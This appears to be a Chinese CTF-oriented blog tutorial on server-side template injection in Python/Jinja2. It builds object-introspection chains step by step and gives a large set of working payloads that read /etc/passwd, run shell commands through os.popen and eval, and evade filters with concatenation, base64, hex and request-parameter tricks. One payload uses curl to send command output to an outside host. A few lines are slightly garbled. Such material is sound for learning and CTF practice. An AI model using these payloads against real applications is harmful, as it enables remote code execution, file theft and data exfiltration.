<p>先举几个基础的例子方便理解：<br>
<strong>1、class</strong></p>
<p>__class__用来查看变量所属的类，格式为变量.<strong>class</strong></p>
<pre><code>&gt;&gt;&gt; ''.__class__
&lt;class 'str'&gt;
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; {}.__class__
&lt;class 'dict'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;
</code></pre>
<p><strong>2、bases</strong></p>
<p>__bases__用来查看类的基类，注意是类的基类，所以格式为变量.<strong>class</strong>.<strong>bases</strong></p>
<pre><code>&gt;&gt;&gt; ''.__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; ().__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; {}.__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; [].__class__.__bases__
(&lt;class 'object'&gt;,)
</code></pre>
<p>同时也能加上数组，比如变量.<strong>class</strong>.<strong>bases</strong>[0]来获得第一个基类。</p>
<p>值得一提的是还有个类是__mro__，它会显示类和基类，这是它和__bases__的不同。</p>
<pre><code>&gt;&gt;&gt; ''.__class__.__mro__
(&lt;class 'str'&gt;, &lt;class 'object'&gt;)
</code></pre>
<p><strong>3、subclasses()</strong></p>
<p><strong>subclasses</strong>()查看当前类的子类，格式变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()<br>
这个类也可以加数组来查看指定的索引值，例如变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[1]</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318123240953.png" alt="image-20230318123240953"></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__bases__[0].__subclasses__()[0]
&lt;class 'type'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个时候就可以开始利用类里面的方法了。</p>
<p>例如:</p>
<pre class="line-numbers language-none"><code class="language-none">变量.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：</p>
<pre class="line-numbers language-none"><code class="language-none">''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>大概是这么个原理，但这样说来还是不知道怎么利用，来看几道题就能更深刻理解了。</p>
<p>之后的题目参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506">https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506</a></p>
<h4 id="魔术对象">魔术对象</h4>
<pre class="line-numbers language-none"><code class="language-none">__class__  :返回类型所属的对象
__mro__    :返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   "返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__  获取当前类的所有子类
__init__  类的初始化方法
__globals__  对包含(保存)函数全局变量的字典的引用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="用魔术对象构造一个简单的语句">用魔术对象构造一个简单的语句</h4>
<p>我们在里面运行以下：</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;
&gt;&gt;&gt; [].__class__.__base__
&lt;class 'object'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()

&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]
&lt;class 'weakcallableproxy'&gt;
&gt;&gt;&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解读一下：<br>
class返回[]所属的对象；<br>
class+base:返回这个对象所继承的基类<br>
class+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类这就是一个具有[]的对象继承的基类的所有子类，在这里面我们不乏可以找到我们要用的子类如前文所提到的：file、open等等。<br>
那么既然我们要用SSTI去做些事情，那么我们就要用到这些子类呗。</p>
<p><strong>如何调用这些子类：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]
&lt;class 'weakcallableproxy'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[3]
&lt;class 'weakproxy'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]
&lt;class 'wrapper_descriptor'&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样我们就可以调用这些子类了</p>
<p>假如我们要去查看某个网页获取flag，那么我们用file函数：(file 在PT2里面还可以使用，在PY3里面已经被移除了)</p>
<pre class="line-numbers language-none"><code class="language-none">[].__class__.__base__.__subclasses__()[40]('fl4g').read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但是如果我们想要去获取目录等等，就需要用到system函数：读取目录一般是ls函数，那么我们来看看如何调用</p>
<pre class="line-numbers language-none"><code class="language-none">!/usr/bin/env python
 encoding: utf-8

num = 0
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print '-'
        num+=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到类中OS模块的函数(71)</p>
<pre class="line-numbers language-none"><code class="language-none">().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
(os.listdir()：列出第一层目录文件 
因为71是os库的函数，所以globals是对该函数字典的引用，所以我们这下就拿到了字典，然后紧接着就是我们要使用的命令。)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>有时候system函数会被过滤掉，我们就使用</p>
<pre class="line-numbers language-none"><code class="language-none">().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')  #读取本级目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="dir-与-dict">dir()与__dict__</h4>
<p>dir()是一个函数，返回的是list；<br>
__dict__是一个字典，键为属性名，值为属性值；<br>
dir()返回所有的属性，而__dict__返回的是非父类的键与对应的值。</p>
<h3 id="2-4-常见的playload">2.4 常见的playload</h3>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">获得基类
#python2.7
''.__class__.__mro__[2]
</span><span class="token punctuation">{</span><span class="token punctuation">}</span>.__class__.__bases__[0]
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token selector">.__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python3.7
''.__。。。class__.__mro__[1]
</span><span class="token punctuation">{</span><span class="token punctuation">}</span>.__class__.__bases__[0]
<span class="token punctuation">(</span><span class="token punctuation">)</span>.__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[40]
#读文件
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[40]<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
#写文件
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[40]<span class="token punctuation">(</span><span class="token string">'/tmp'</span><span class="token punctuation">)</span>.<span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.func_globals.linecache.os.<span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
#eval<span class="token punctuation">,</span>impoer等全局函数
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__[<span class="token string">'__builtins__'</span>][<span class="token string">'eval'</span>]<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span>
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__.__builtins__.<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span>
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__.__builtins__.__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.<span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
[].__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__[<span class="token string">'__builtins__'</span>][<span class="token string">'__import__'</span>]<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.<span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

#python3.7
#命令执行
<span class="token punctuation">{</span>% for c in [].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">}</span><span class="token punctuation">{</span>% if c.__name__==<span class="token string">'catch_warnings'</span> %<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c.__init__.__globals__[<span class="token string">'__builtins__'</span>].<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span>% endif %<span class="token punctuation">}</span><span class="token punctuation">{</span>% endfor %<span class="token punctuation">}</span>
#文件操作
<span class="token punctuation">{</span>% for c in [].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> %<span class="token punctuation">}</span><span class="token punctuation">{</span>% if c.__name__==<span class="token string">'catch_warnings'</span> %<span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c.__init__.__globals__[<span class="token string">'__builtins__'</span>].<span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span>% endif %<span class="token punctuation">}</span><span class="token punctuation">{</span>% endfor %<span class="token punctuation">}</span>
#windows下的os命令
<span class="token string">""</span>.__class__.__bases__[0].__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[118].__init__.__globals__[<span class="token string">'popen'</span>]<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-5-常见的命令执行方式">2.5 常见的命令执行方式</h3>
<h4 id="os-system">os.system()</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">…init__globals[‘os’].<span class="token function">system</span><span class="token punctuation">(</span>‘ls’<span class="token punctuation">)</span>的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回0，失败返回-1，因为输出结果不明显，所以我们也会用到下面这个命令：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="os-popen">os.popen()</h4>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">用法：os.<span class="token function">popen</span><span class="token punctuation">(</span>command[<span class="token punctuation">,</span>mode[<span class="token punctuation">,</span>bufsize]]<span class="token punctuation">)</span>
<span class="token property">eg</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.class.base.subclass__<span class="token punctuation">(</span><span class="token punctuation">)</span>[71].init.globlas__[‘os’].<span class="token function">popen</span><span class="token punctuation">(</span>‘ls’<span class="token punctuation">,</span>‘r’<span class="token punctuation">)</span>.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
说明：mode – 模式权限可以是 ‘r’<span class="token punctuation">(</span>默认<span class="token punctuation">)</span> 或 ‘w’。
init.globals__[‘os’].<span class="token function">popen</span><span class="token punctuation">(</span>‘ls’<span class="token punctuation">,</span>‘r’<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
popen方法通过p.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>获取终端输出，而且popen需要关闭<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.当执行成功时，<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>不返回任何值，失败时，<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息</strong></p>
<h4 id="warnings-catchwarning">warnings.catchwarning</h4>
<p>访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p>
<p>于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试）</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">[].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.__globals__[<span class="token string">'linecache'</span>].__dict__[<span class="token string">'os'</span>].<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>

[].__class__.__base__.__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>[59].__init__.func_globals[<span class="token string">'linecache'</span>].__dict__.<span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span>[12].<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="values">values</h4>
<p>作用：返回字典中的所有值。<br>
使用：</p>
<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/python

dict = {'Name': 'Zara', 'Age': 7}

print "Value : %s" %  dict.values()

以上实例输出结果为：

Value : [7, 'Zara']<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="builtins-内建函数">__builtins__内建函数</h4>
<p><strong>内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多我们需要的eval函数，可以执行命令,但是经常会被ban</strong></p>
<pre class="line-numbers language-none"><code class="language-none">当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。

内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。

`__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。

__globals__：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

__import__()：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 __import__() 来动态载入，就是 import。语法：__import__(模块名)

这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").popen("ls").read()')

这两个payload用的是同一个模块,__builtins__模块,eval方法.

[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].popen('ls').read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="绕过">绕过</h4>
<p><strong>拼接</strong></p>
<pre class="line-numbers language-none"><code class="language-none">object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')

().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>编码</strong></p>
<pre class="line-numbers language-none"><code class="language-none">
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")

等价于

().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(可以看出单双引号内的都可以编码)

同理还可以进行rot13、16进制编码等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>过滤中括号[]</strong></p>
<pre class="line-numbers language-none"><code class="language-none">getitem()

"".__class__.__mro__[2]
"".__class__.__mro__.__getitem__(2)

pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。

''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)
('/etc/passwd').read()
若.也被过滤，使用原生JinJa2函数|attr()
将request.__class__改成request|attr("__class__")

字典读取

__builtins__['eval']()
__builtins__.eval()

经过测试这种方法在python解释器里不能执行，但是在测试的题目环境下可以执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤双下划线">过滤双下划线__</h4>
<pre class="line-numbers language-none"><code class="language-none">{{
''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__

将其中的 request.args 改为 request.values 则利用post的方式进行传参

GET:
{{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]
('/etc/passwd').read() }}

POST:
class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤花括号">过滤花括号</h4>
<pre class="line-numbers language-none"><code class="language-none">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
或者：	
{% if ''.__class__.__mro__[2].__subclasses__()
[59].__init__.func_globals.linecache.os.popen('curl
http://http.bin.buuoj.cn/1inhq4f1 -d `ls / | grep flag`;') %}1{% endif %}
如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'
%}1{% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤引号">过滤引号</h4>
<p>request.args 是flask中的一个属性,为返回请求的参数,这里把 path 当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
<pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)
(request.args.path).read()}}&amp;path=/etc/passw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="过滤了单双引号和中括号">过滤了单双引号和中括号</h4>
<p>request.cookies仍然可以用<br>
单双引号的绕过还是利用之前提到的姿势，至于中括号的绕过拿点绕过，拿 <strong>getitem</strong> 等绕过都可<br>
以。<br>
使用request绕过的话可以这样：</p>
<pre class="line-numbers language-none"><code class="language-none">?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="过滤关键字">过滤关键字</h4>
<p>base64编码绕过<br>
<strong>getattribute</strong> 使用实例访问属性时,调用该方法<br>
例如被过滤掉 <strong>class</strong> 关键词</p>
<pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()
[40]("/etc/passwd").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="字符串拼接绕过">字符串拼接绕过</h4>
<pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]
("/etc/passwd").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="过滤">过滤 _</h4>
<pre class="line-numbers language-none"><code class="language-none">利用request.args属性
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]
('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
将其中的request.args改为request.values则利用post的方式进行传参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤os">过滤os</h4>
<pre class="line-numbers language-none"><code class="language-none">?name=
{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).
read()}}&amp;a=__globals__&amp;b=os&amp;c=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="过滤args">过滤args</h4>
<pre class="line-numbers language-none"><code class="language-none">?name={{url_for.__globals__[request.cookies.a][request.cookies.b]
(request.cookies.c).read()}}
cookie：a=os;b=popen;c=cat /flag

{{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
cookie:a=__globals__;b=cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="引号内十六进制绕过">引号内十六进制绕过</h4>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__}}
{{""["\x5f\x5fclass\x5f\x5f"

_`是`\x5f`，`.`是`\x2E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="’-chr等被过滤，无法引入字符串">" ’ chr等被过滤，无法引入字符串</h4>
<ul>
<li>直接拼接键名</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">dict(buil=aa,tins=dd)|join()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>利用 string 、 pop 、 list 、 slice 、 first 等过滤器从已有变量里面直接找</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">(app.__doc__|list()).pop(102)|string()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>构造出 % 和 c 后，用格式化字符串代替 <strong>chr</strong></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">{%set udl=dict(a=pc,c=c).values()|join %}     # uld=%c
{%set i1=dict(a=i1,c=udl%(99)).values()|join %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="过滤数字">过滤数字</h4>
<p>例如web370<br>
就想办法构造出数字</p>
<pre class="line-numbers language-none"><code class="language-none">?name=
{% set c=(dict(e=a)|join|count)%}
{% set cc=(dict(ee=a)|join|count)%}
{% set ccc=(dict(eee=a)|join|count)%}
{% set cccc=(dict(eeee=a)|join|count)%}
{% set ccccccc=(dict(eeeeeee=a)|join|count)%}
{% set cccccccc=(dict(eeeeeeee=a)|join|count)%}
{% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%}
{% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%}
{% set coun=(cc~cccc)|int%}
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(coun)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set
file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccc
cc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%}
{%print(x.open(file).read())%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="使用-Jinja2-过滤器绕过">使用 Jinja2 过滤器绕过</h4>
<p>在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号<code>|</code>隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号<code>|</code>连接多个过滤器，一个过滤器的输出应用于下一个过滤器。<br>
内置过滤器列表如下：</p>
<table>
<thead>
<tr>
<th>abs()</th>
<th>forceescape()</th>
<th>map()</th>
<th>select()</th>
<th>unique()</th>
</tr>
</thead>
<tbody>
<tr>
<td>attr()</td>
<td>format()</td>
<td>max()</td>
<td>selectattr()</td>
<td>upper()</td>
</tr>
<tr>
<td>batch()</td>
<td>groupby()</td>
<td>min()</td>
<td>slice()</td>
<td>urlencode()</td>
</tr>
<tr>
<td>capitalize()</td>
<td>indent()</td>
<td>pprint()</td>
<td>sort()</td>
<td>urlize()</td>
</tr>
<tr>
<td>center()</td>
<td>int()</td>
<td>random()</td>
<td>string()</td>
<td>wordcount()</td>
</tr>
<tr>
<td>default()</td>
<td>items()</td>
<td>reject()</td>
<td>striptags()</td>
<td>wordwrap()</td>
</tr>
<tr>
<td>dictsort()</td>
<td>join()</td>
<td>rejectattr()</td>
<td>sum()</td>
<td>xmlattr()</td>
</tr>
<tr>
<td>escape()</td>
<td>last()</td>
<td>replace()</td>
<td>title()</td>
<td>filesizeformat()</td>
</tr>
<tr>
<td>length()</td>
<td>reverse()</td>
<td>tojson()</td>
<td>first()</td>
<td>list()</td>
</tr>
<tr>
<td>round()</td>
<td>trim()</td>
<td>float()</td>
<td>lower()</td>
<td>safe()</td>
</tr>
<tr>
<td>truncate()</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>其中常见过滤器用法如下：</p>
<blockquote>
<p>abs()<br>
  返回参数的绝对值。<br>
attr()<br>
  获取对象的属性。foo|attr(“bar”) 等价于 foo.bar<br>
capitalize()<br>
  第一个字符大写，所有其他字符小写。<br>
first()<br>
  返回序列的第一项。<br>
float()<br>
  将值转换为浮点数。如果转换不起作用将返回 0.0。<br>
int()<br>
  将值转换为整数。如果转换不起作用将返回 0。<br>
items()<br>
  返回一个迭代器(key, value)映射项。</p>
</blockquote>
<p>其他用法详见官方文档：</p>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/latest/templates/#list-of-builtin-filters">Template Designer Documentation - Jinja Documentation (3.2.x)</a></p>
<p>使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种：</p>
